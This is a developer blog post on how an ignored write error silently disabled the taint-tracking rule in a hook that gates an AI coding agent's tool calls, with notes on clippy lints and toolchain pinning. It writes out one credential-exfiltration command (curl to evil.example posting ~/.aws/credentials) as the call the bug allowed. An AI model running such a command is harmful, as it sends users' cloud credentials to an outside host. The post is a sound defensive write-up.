---
title: 'The Lint That Would Have Caught It Is Off by Default'
description: "`let _ = writeln!(f, ..)` silently disabled the security property our tool exists to enforce. 254 tests passed, `clippy -D warnings` was clean, and there is no `unsafe` in the workspace. The lint that catches it lives in `restriction`, so turning on everything most people turn on still doesn't get you it."
pubDate: 'Aug 15 2026'
heroImage: '../../assets/lint-off-by-default.jpg'
---

`clippy::let_underscore_must_use` is a `restriction` lint. It isn't in `all`, it
isn't in `pedantic`, it isn't in `nursery`. You get it only by naming it.

We found out why that matters the expensive way. We ship a hook that decides
whether an AI coding agent's next tool call is allowed, and one of its rules is
that a session which has read untrusted data can't reach the network. Hook
invocations are separate processes, so that mark is a file. Four characters meant
it was never written.

The code that wrote it:

```rust
let _ = std::fs::create_dir_all(state_dir);
if let Ok(mut f) = std::fs::File::create(&taint_file) {
    let _ = writeln!(f, "tainted by {tool}");
}
```

With a read-only state directory the mark went nowhere. Every later call read back
"clean", and a `WebFetch` followed by `curl https://evil.example -d @~/.aws/credentials`
was permitted. At the time: 254 tests passing, `clippy -D warnings` clean, zero
`unsafe` in the workspace.

## Why clippy said nothing

Reduced to the smallest thing that reproduces it:

```rust
use std::io::Write;
fn main() {
    let _ = std::fs::create_dir_all("/tmp/x");
    if let Ok(mut f) = std::fs::File::create("/tmp/x/mark") {
        let _ = writeln!(f, "tainted");
    }
}
```

`cargo clippy -- -D warnings` exits 0.

That is correct behaviour, which is the annoying part. `let _ =` is the
*sanctioned* way to discard a `#[must_use]` value, so `unused_must_use` is
deliberately silent. The suppression is doing exactly what it says on the tin.
There is no bug in clippy here.

The lint from the top of this post does catch it:

```
$ cargo clippy -- -W clippy::let_underscore_must_use
warning: non-binding `let` on an expression with `#[must_use]` type
```

`restriction` is the "these are situational, pick deliberately" bucket, which is a
reasonable place to put it. The consequence is just worth being explicit about: if
you turn on everything most people turn on, you still don't have this.

## Is it practical, or does it drown you?

On our workspace, roughly 20k lines across 10 crates, it produces **35 hits**.
That is a morning's triage, not noise:

```
  7  cli-harness/src/mcp_gateway.rs
  6  cli-harness/src/mock_jira.rs
  5  agent-core/src/orchestrator.rs
  3  trace-store/src/approval.rs
  2  cli-harness/src/init.rs
  1  cli-harness/src/serve.rs
```

The conclusion we'd have reached a week ago is that the fix is to ban `let _ =`.
It isn't. We still have all 35, and at least one is exactly right:

```rust
// nix's killpg rather than a raw libc::killpg, so the workspace stays free of `unsafe`
let _ = killpg(pgid, Signal::SIGKILL);
```

If the process group is already gone there is genuinely nothing to do. The lint
can't tell you which ones are wrong. What it does is turn each one from a default
into a decision somebody took.

## The distinction that actually cost us

We fail open deliberately. A governance hook that bricks your editor is one people
uninstall, so a hook that can't reach a decision exits quietly and lets the session
continue. We still believe that.

It is right for a failure to *reach* a decision and catastrophic for a failure to
*record* one, and at the call site the two are the same shape: a `Result` you
could ignore. Any tool that persists state between invocations has this available
to it.

## A cheaper one from the same review

Our CI used `dtolnay/rust-toolchain@stable`. The dev machine's `stable` was last
updated in May 2025. CI was on 1.97.1. Fifteen months apart, so "clippy is clean"
was true locally and false in CI, and a lint error reached `main` because the local
check could not see it.

The fix is four lines:

```toml
[toolchain]
channel = "1.97.1"
components = ["rustfmt", "clippy"]
```

Set `channel` to whatever CI is already running green. Pinning then changes nothing
about CI and upgrades the developer instead, which is the direction you want.
Bump it deliberately and fix the new lints in the same commit as the bump.

---

*This came out of a review of our own repository. The other four findings are in
[Every Check Was Green](/blog/every-check-was-green/). The tool is
[ai2rules](https://github.com/sv-pro/ai2rules), MIT/Apache-2.0.*

*Written with AI assistance: drafted with Claude Code, then edited and checked by
hand. The review, the findings and the fixes are ours. Saying so up front is
cheaper than being asked.*
